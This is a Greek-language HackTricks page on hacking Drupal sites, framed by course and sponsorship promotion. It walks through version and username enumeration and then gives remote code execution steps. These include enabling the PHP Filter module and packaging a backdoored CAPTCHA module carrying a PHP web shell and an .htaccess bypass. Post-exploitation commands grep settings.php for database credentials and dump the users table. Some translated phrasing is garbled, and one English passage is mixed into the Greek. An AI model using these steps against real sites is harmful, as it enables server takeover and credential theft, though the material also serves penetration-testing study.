# Drupal

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Ανακάλυψη

* Ελέγξτε το **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **Κόμβος**: Το Drupal **ευρίσκει το περιεχόμενό του χρησιμοποιώντας κόμβους**. Ένας κόμβος μπορεί να **περιέχει οτιδήποτε**, όπως ένα άρθρο ιστολογίου, ψηφοφορία, άρθρο κ.λπ. Οι URI των σελίδων είναι συνήθως της μορφής `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## Απαρίθμηση

Το Drupal υποστηρίζει από προεπιλογή **τρεις τύπους χρηστών**:

1. **`Διαχειριστής`**: Αυτός ο χρήστης έχει πλήρη έλεγχο του ιστότοπου Drupal.
2. **`Εξουσιοδοτημένος Χρήστης`**: Αυτοί οι χρήστες μπορούν να συνδεθούν στον ιστότοπο και να εκτελέσουν λειτουργίες όπως προσθήκη και επεξεργασία άρθρων βάσει των δικαιωμάτων τους.
3. **`Ανώνυμος`**: Όλοι οι επισκέπτες του ιστότοπου θεωρούνται ανώνυμοι. Από προεπιλογή, αυτοί οι χρήστες επιτρέπεται μόνο η ανάγνωση των αναρτήσεων.

### Έκδοση

* Ελέγξτε το `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Οι νεότερες εγκαταστάσεις του Drupal αποκλείουν από προεπιλογή την πρόσβαση στα αρχεία `CHANGELOG.txt` και `README.txt`.
{% endhint %}

### Απαρίθμηση ονομάτων χρηστών

#### Εγγραφή

Στο _/user/register_ απλά προσπαθήστε να δημιουργήσετε ένα όνομα χρήστη και αν το όνομα είναι ήδη κατειλημμένο, θα εμφανιστεί ειδοποίηση:

![](<../../.gitbook/assets/image (254).png>)

#### Αίτηση νέου κωδικού πρόσβασης

Εάν ζητήσετε ένα νέο κωδικό πρόσβασης για ένα υπάρχον όνομα χρήστη:

![](<../../.gitbook/assets/image (255).png>)

Εάν ζητήσετε ένα νέο κωδικό πρόσβασης για ένα μη υπάρχον όνομα χρήστη:

![](<../../.gitbook/assets/image (256).png>)

### Απόκτηση αριθμού χρηστών

Αποκτώντας πρόσβαση στο _/user/\<αριθμός>_, μπορείτε να δείτε τον αριθμό των υπαρχόντων χρηστών, σε αυτήν την περίπτωση είναι 2, καθώς το _/users/3_ επιστρέφει ένα σφάλμα "δεν βρέθηκε":

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### Κρυφές σελίδες

**Δοκιμάστε `/node/$` όπου `$` είναι ένας αριθμός** (από 1 έως 500 για παράδειγμα).\
Μπορείτε να βρείτε **κρυφές σελίδες** (δοκιμαστικές, ανάπτυξης) που δεν αναφέρονται από τις μηχανές αναζήτησης.

#### Πληροφορίες για εγκατεστημένα modules
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Αυτόματο

Η αυτόματη εκτέλεση είναι μια τεχνική που χρησιμοποιείται στον χώρο του χάκινγκ για να εκτελέσει αυτόματα επιθέσεις ή διαδικασίες. Αυτό μπορεί να γίνει με τη χρήση εργαλείων αυτοματισμού, όπως σενάρια εκτέλεσης εντολών ή σενάρια προγραμματισμού. Η αυτόματη εκτέλεση μπορεί να επιτρέψει στον χάκερ να εκτελέσει γρήγορα και αποτελεσματικά επιθέσεις, εξοικονομώντας χρόνο και προσπάθεια. Ωστόσο, πρέπει να ληφθούν προφυλάξεις για να αποφευχθεί η παραβίαση των νόμων και η παραβίαση της ιδιωτικότητας ή της ασφάλειας των συστημάτων.
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Με το Πρόσθετο PHP Filter

{% hint style="warning" %}
Σε παλαιότερες εκδόσεις του Drupal **(πριν την έκδοση 8)**, ήταν δυνατό να συνδεθείτε ως διαχειριστής και **ενεργοποιήσετε το πρόσθετο `PHP filter`**, το οποίο "Επιτρέπει την αξιολόγηση ενσωματωμένου κώδικα PHP/αποσπασμάτων."
{% endhint %}

Χρειάζεστε την **εγκατάσταση του πρόσθετου php** (ελέγξτε αυτό προσπελαύνοντας το _/modules/php_ και αν επιστρέφει **403**, τότε **υπάρχει**, αν δεν βρεθεί, τότε **το πρόσθετο php δεν είναι εγκατεστημένο**)

Πηγαίνετε στο _Πρόσθετα_ -> (**Ελέγξτε**) _PHP Filter_ -> _Αποθήκευση ρυθμίσεων_

![](<../../.gitbook/assets/image (247) (1).png>)

Στη συνέχεια, κάντε κλικ στο _Προσθήκη περιεχομένου_ -> Επιλέξτε _Βασική σελίδα_ ή _Άρθρο_ -> Γράψτε _κώδικα php shell_ στο πεδίο _Σώμα_ -> Επιλέξτε _Κώδικας PHP_ στη μορφή κειμένου -> Επιλέξτε _Προεπισκόπηση_

![](<../../.gitbook/assets/image (253) (1).png>)

Τέλος, απλά αποκτήστε πρόσβαση στον νεοδημιουργηθέντα κόμβο:
```bash
curl http://drupal-site.local/node/3
```
### Εγκατάσταση του Αρθρώματος PHP Filter

Από την έκδοση **8 και μετά, το** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **αρθρώματα δεν εγκαθίστανται από προεπιλογή**. Για να αξιοποιήσουμε αυτήν τη λειτουργικότητα, θα πρέπει να **εγκαταστήσουμε το αρθρώμα μόνοι μας**.

1. Κατεβάστε την πιο πρόσφατη έκδοση του αρθρώματος από την ιστοσελίδα του Drupal.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Αφού κατεβάσετε το αρχείο, πηγαίνετε στο **`Διαχείριση`** > **`Αναφορές`** > **`Διαθέσιμες ενημερώσεις`**.
3. Κάντε κλικ στο **`Περιήγηση`**`,` επιλέξτε το αρχείο από τον φάκελο στον οποίο το κατεβάσατε, και κάντε κλικ στο **`Εγκατάσταση`**.
4. Αφού εγκατασταθεί το αρθρώμα, μπορούμε να κάνουμε κλικ στο **`Περιεχόμενο`** και **δημιουργήσουμε μια νέα βασική σελίδα**, παρόμοια με το παράδειγμα του Drupal 7. Πάλι, βεβαιωθείτε ότι **επιλέγετε `Κώδικας PHP` από την αναπτυσσόμενη λίστα `Μορφή κειμένου`**.

### Αρθρώματος με παρασυρμένο πίσω πόρτα

Ένα αρθρώματος με παρασυρμένο πίσω πόρτα μπορεί να δημιουργηθεί **προσθέτοντας ένα shell σε ένα υπάρχον αρθρώμα**. Τα αρθρώματα μπορούν να βρεθούν στην ιστοσελίδα drupal.org. Ας επιλέξουμε ένα αρθρώμα, όπως το [CAPTCHA](https://www.drupal.org/project/captcha). Κατέβασε το αρχείο tar.gz [αρχείο](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Κατεβάστε το αρχείο και αποσυμπιέστε τα περιεχόμενά του.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Δημιουργήστε ένα **PHP web shell** με τα παρακάτω περιεχόμενα:
```php
<?php
system($_GET["cmd"]);
?>
```
* Στη συνέχεια, πρέπει να δημιουργήσουμε ένα αρχείο **`.htaccess`** για να αποκτήσουμε πρόσβαση στον φάκελο. Αυτό είναι απαραίτητο επειδή το Drupal απορρίπτει την άμεση πρόσβαση στον φάκελο **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Η παραπάνω διαμόρφωση θα εφαρμόσει κανόνες για τον φάκελο / όταν ζητήσουμε ένα αρχείο στον φάκελο /modules. Αντιγράψτε και τα δύο αρχεία στον φάκελο captcha και δημιουργήστε ένα αρχείο αρχειοθέτησης.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Υποθέτοντας ότι έχουμε **διαχειριστική πρόσβαση** στον ιστότοπο, κάντε κλικ στο **`Διαχείριση`** και στη συνέχεια στο **`Επέκταση`** στην πλαϊνή γραμμή. Στη συνέχεια, κάντε κλικ στο κουμπί **`+ Εγκατάσταση νέου πρόσθετου`**, και θα μας μεταφέρει στη σελίδα εγκατάστασης, όπως για παράδειγμα `http://drupal-site.local/admin/modules/install`. Περιηγηθείτε στο αρχείο Captcha με παρασιτικό κώδικα και κάντε κλικ στο **`Εγκατάσταση`**.
* Αφού η εγκατάσταση επιτύχει, περιηγηθείτε στο **`/modules/captcha/shell.php`** για να εκτελέσετε εντολές.

## Μετά την εκμετάλλευση

### Διαβάστε το settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Αποθήκευση χρηστών από τη βάση δεδομένων

To dump users from a Drupal database, you can use the following command:

```bash
drush sql-dump --tables-list=users > users.sql
```

This command will create a SQL dump file called `users.sql` that contains the user data from the Drupal database.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Αναφορές

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
